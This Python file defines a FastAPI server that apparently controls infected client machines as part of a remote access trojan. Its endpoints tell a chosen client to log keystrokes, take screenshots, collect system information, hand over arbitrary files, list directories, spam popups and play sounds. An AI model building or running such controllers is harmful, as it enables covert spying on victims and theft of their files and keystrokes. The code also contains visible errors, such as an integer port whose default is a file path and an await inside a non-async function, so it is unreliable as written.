import argparse
import base64
from pathlib import Path
from typing import Optional

import uvicorn
from fastapi import FastAPI, UploadFile, File

import configurator
from commands import PopupCommand, PopupParameters, BasicCommand, CommandType, KeyLogCommand, KeyLogParameters, \
    GetFileCommand, GetFileParameters, DirListCommand, DirListParameters, PlaySoundCommand, PlaySoundParameters
from protocol.requests import RequestHeader, RequestType, SendCommandRequest, SendCommandContent
from protocol.responses import BasicResponse, SendCommandResponse

argument_parser = argparse.ArgumentParser()
argument_parser.add_argument("-c", "--config", default="../conf.json", type=Path, help="Path to config file")
argument_parser.add_argument("-p", "--port", default="../conf.json", type=int,
                             help="Port to listen for api requests on")
args = argument_parser.parse_args()

app = FastAPI()
server = configurator.parse(args.config)


@app.get("/")
async def make_command_request(request: SendCommandRequest) -> SendCommandResponse:
    return server.handle_send_command(request)


@app.put("/popup")
async def send_popup_command(client_id: str, message: str) -> BasicResponse:
    return await make_command_request(
        SendCommandRequest(
            header=RequestHeader(
                client_id=client_id,
                request_type=RequestType.SendCommand
            ),
            content=SendCommandContent(
                command=PopupCommand(
                    parameters=PopupParameters(
                        message=message
                    )
                )
            )
        )
    )


@app.put("/popup-spam")
async def send_popup_spam_command(client_id: str, message: str) -> BasicResponse:
    return await make_command_request(
        SendCommandRequest(
            header=RequestHeader(
                client_id=client_id,
                request_type=RequestType.SendCommand
            ),
            content=SendCommandContent(
                command=PopupCommand(
                    command_type=CommandType.PopupSpam,
                    parameters=PopupParameters(
                        message=message
                    )
                )
            )
        )
    )


@app.get("/screenshot")
async def send_screenshot_command(client_id: str) -> BasicResponse:
    return await make_command_request(
        SendCommandRequest(
            header=RequestHeader(
                client_id=client_id,
                request_type=RequestType.SendCommand
            ),
            content=SendCommandContent(command=BasicCommand(command_type=CommandType.Screenshot))
        )
    )


@app.get("/keylog")
async def send_keylog_command(client_id: str, duration: int) -> BasicResponse:
    return await make_command_request(
        SendCommandRequest(
            header=RequestHeader(
                client_id=client_id,
                request_type=RequestType.SendCommand
            ),
            content=SendCommandContent(command=KeyLogCommand(parameters=KeyLogParameters(duration=duration)))
        )
    )


@app.get("/get-system-info")
async def send_get_system_info_command(client_id: str) -> BasicResponse:
    return await make_command_request(
        SendCommandRequest(
            header=RequestHeader(
                client_id=client_id,
                request_type=RequestType.SendCommand
            ),
            content=SendCommandContent(command=BasicCommand(command_type=CommandType.GetSystemInfo))
        )
    )


@app.get("/getfile")
async def send_getfile_command(client_id: str, path: str) -> BasicResponse:
    return await make_command_request(
        SendCommandRequest(
            header=RequestHeader(
                client_id=client_id,
                request_type=RequestType.SendCommand
            ),
            content=SendCommandContent(command=GetFileCommand(parameters=GetFileParameters(path=path)))
        )
    )


@app.get("/dirlist")
async def send_dirlist_command(client_id: str, path: str, tree: bool = True, depth: Optional[int] = None) -> BasicResponse:
    return await make_command_request(
        SendCommandRequest(
            header=RequestHeader(
                client_id=client_id,
                request_type=RequestType.SendCommand
            ),
            content=SendCommandContent(command=DirListCommand(parameters=DirListParameters(path=path,
                                                                                           depth=depth,
                                                                                           tree=tree)))
        )
    )


@app.put("/play-sound")
async def send_play_sound_command(client_id: str, sound_buffer: UploadFile = File(...)) -> BasicResponse:
    return await make_command_request(
        SendCommandRequest(
            header=RequestHeader(
                client_id=client_id,
                request_type=RequestType.SendCommand
            ),
            content=SendCommandContent(command=PlaySoundCommand(
                parameters=PlaySoundParameters(
                    sound_buffer=base64.b64encode(await sound_buffer.read())
                )
            ))
        )
    )


@app.get("/is-alive")
def is_alive(client_id: str) -> BasicResponse:
    return await server.is_alive(client_id)


if __name__ == '__main__':
    uvicorn.run(app, host="0.0.0.0", port=args.port)
